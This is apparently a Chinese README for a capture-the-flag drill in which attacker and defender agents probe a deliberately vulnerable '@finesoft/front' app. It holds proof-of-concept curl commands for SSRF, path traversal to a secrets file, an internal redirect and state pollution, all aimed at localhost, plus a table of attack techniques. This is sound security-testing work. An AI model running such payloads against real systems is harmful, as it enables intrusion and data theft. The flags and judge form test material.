# Adversarial drill: 压测 `@finesoft/front` 默认安全

CTF 风格的攻防对抗，用来检验框架在「应用作者只用默认特性」时的实际防护能力。

## 怎么跑

```bash
# 启动靶场 + 两个内部服务
./orchestrator/run.sh start

# 手工跑一下 5 个 PoC，看 flag 是否被触发
curl 'http://localhost:5173/image-proxy?url=http://127.0.0.1:9999/'
curl 'http://localhost:5173/?user=admin' && curl 'http://localhost:5173/admin/secrets'
curl 'http://localhost:5173/search?q=nope'
curl 'http://localhost:5173/static?file=../data/secrets/flag.txt'
curl 'http://localhost:5173/share?next=http://127.0.0.1:5174/admin/welcome-flag'
curl 'http://localhost:5173/profile/admin'

# 派 attacker / defender agent（人工或脚本协调）
# attacker prompt: orchestrator/attacker-prompt.md
# defender prompt: orchestrator/defender-prompt.md

# judge: 解析报告里出现的 FLAG 与 flags.json 比对
node orchestrator/judge.mjs reports/round-1-attacker.md

# 停止
./orchestrator/run.sh stop
```

## 5 个 flag

| 类别              | flag                 | 攻击姿势                                                   |
| ----------------- | -------------------- | ---------------------------------------------------------- |
| F1 SSRF           | `FLAG{ssrf-...}`     | `HttpClient(baseUrl=user-input)` → 内部 metadata 服务      |
| F2 状态污染       | `FLAG{di-...}`       | middleware 用 module-level 单例缓存 user → 跨请求污染      |
| F3 错误泄漏       | `FLAG{stack-...}`    | controller 抛错暴露 cwd → path traversal 读 secrets        |
| F4 SSR-side fetch | `FLAG{redir-...}`    | controller 用 user-input URL 发起服务端 fetch → 内部 admin |
| F5 prefetch 泄漏  | `FLAG{prefetch-...}` | controller 返回的 page 对象含敏感字段 → 全量序列化到 HTML  |

## 文件布局

- `target-app/` — 故意写得"普通"的 finesoft 应用
- `internal-services/` — 模拟 metadata + 内部 admin endpoint
- `flags.json` — 真值
- `orchestrator/` — 启动脚本 + judge + attacker/defender prompt
- `reports/` — 攻防原始日志 + final.md
